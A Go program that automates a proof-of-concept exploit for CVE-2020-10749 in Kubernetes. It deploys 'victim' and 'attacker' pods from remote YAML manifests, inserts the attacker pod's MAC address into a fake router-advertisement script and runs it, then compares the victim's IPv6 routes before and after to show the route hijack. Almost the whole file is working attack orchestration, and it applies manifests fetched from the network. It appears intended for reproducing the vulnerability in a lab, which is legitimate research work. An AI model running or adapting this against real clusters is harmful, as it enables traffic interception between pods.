package main

import (
	"fmt"
	"log"
	"os/exec"
	"sync"
)

func executeCommand(command string) (string, error) {
	cmd := exec.Command("bash", "-c", command)
	output, err := cmd.CombinedOutput()
	return string(output), err
}

func mainfunc() {
	var wg sync.WaitGroup

	fmt.Println("preparing pods")
	// Apply victim YAML
	if _, err := executeCommand("kubectl apply -f https://raw.githubusercontent.com/jerrybowang/CVE-2020-10749/master/victim/victim.yml"); err != nil {
		log.Fatal(err)
	}

	// Apply attacker YAML
	if _, err := executeCommand("kubectl apply -f https://raw.githubusercontent.com/jerrybowang/CVE-2020-10749/master/attacker/attacker.yml"); err != nil {
		log.Fatal(err)
	}
	
	// Set up curl in victim pod
// 	if _, err := executeCommand("kubectl exec -i $(kubectl get pods -o name | grep victim) -- sh -c 'apk add curl'"); err != nil {
// 		log.Fatal(err)
// 	}

	fmt.Println("finish preparing pods")
	
	// Get IPv6 routes from victim pod
	victimRoutesCmd := "kubectl exec -i $(kubectl get pods -o name | grep victim) -- sh -c 'ip -6 route'"
	victimRoutesOutput, err := executeCommand(victimRoutesCmd)
	if err != nil {
		log.Fatal(err)
	}

	// Print the result of IPv6 routes from victim pod
	fmt.Println("Victim Routes Output (1st time):\n", victimRoutesOutput)

	// Get and store MAC address from attacker pod
	getMACCmd := "kubectl exec -i $(kubectl get pods -o name | grep attacker) -- sh -c \"ip a show eth0 | grep 'link/ether' | awk '{print \\$2}'\""
	macAddress, err := executeCommand(getMACCmd)
	if err != nil {
		log.Fatal(err)
	}
	
	// Print the MAC address
	fmt.Println("Attacker MAC Address:", macAddress)
	
	// in one shell, Apply attacker YAML and enter attacker pod
	wg.Add(1)
	go func() {
		defer wg.Done()

		// Replace [YOUR_MAC_ADDR] in fake_ra.py with the stored MAC address
		replaceMACCmd := fmt.Sprintf("kubectl exec -i $(kubectl get pods -o name | grep attacker) -- sh -c \"sed -i 's/\\[YOUR_MAC_ADDR\\]/%s/g' fake_ra.py; python fake_ra.py\"", macAddress)
		if _, err := executeCommand(replaceMACCmd); err != nil {
			log.Fatal(err)
		}
	}()

	// Wait for the commands to finish
	wg.Wait()

	// Get IPv6 routes from victim pod again after attacker commands have completed
	victimRoutesOutputAgain, err := executeCommand(victimRoutesCmd)
	if err != nil {
		log.Fatal(err)
	}

	// Print the result of IPv6 routes from victim pod after attacker commands
	fmt.Println("Victim Routes Output (2nd time):\n", victimRoutesOutputAgain)
}
